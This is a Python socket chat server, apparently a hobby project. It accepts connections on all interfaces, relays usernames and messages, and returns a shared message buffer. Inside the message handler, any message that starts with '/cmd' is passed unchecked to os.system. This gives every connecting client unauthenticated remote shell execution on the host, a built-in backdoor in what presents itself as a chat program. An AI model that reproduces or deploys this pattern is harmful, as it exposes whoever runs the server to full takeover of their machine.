import socket
import threading
import os

PORT = 8000
SERVER = "0.0.0.0"
print(socket.gethostbyname(socket.gethostname()))
ADDR = (SERVER, PORT)

buff = []

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

def send(msg, client):
    message = msg.encode("utf-8")
    msg_length = len(message)
    send_length = str(msg_length).encode("utf-8")
    send_length += b' ' * (64 - len(send_length))
    client.send(send_length)
    client.send(message)


def clienthan(conn, addr):
    global buff
    username = False
    un = ""
    connected = True
    while connected:
        if not username:
            msg_length = (conn.recv(64).decode("utf-8"))
            if msg_length:
                msg_length = int(msg_length)
                msg = conn.recv(msg_length).decode("utf-8")
                if msg == "/bye":
                    connected = False
                un = msg
                username = True
        else:
            msg_length = (conn.recv(64).decode("utf-8"))
            if msg_length:
                msg_length = int(msg_length)
                msg = conn.recv(msg_length).decode("utf-8")
                if msg == "/bye":
                    connected = False
                if msg[:4] != "/cmd":
                    a = f"{un}: {msg}"
                    buff.append(a)
                else:
                    os.system(msg[4:])
                if msg == ";check":
                    b = f"{str(buff[:-1])}"
                    print(b)
                    conn.send(b.encode("utf-8"))
                    buff = []

                        

    conn.close()


def start():
    server.listen()
    while(True):
        conn, addr = server.accept()
        thread = threading.Thread(target=clienthan, args=(conn, addr))
        thread.start()

print("server starting")
start()
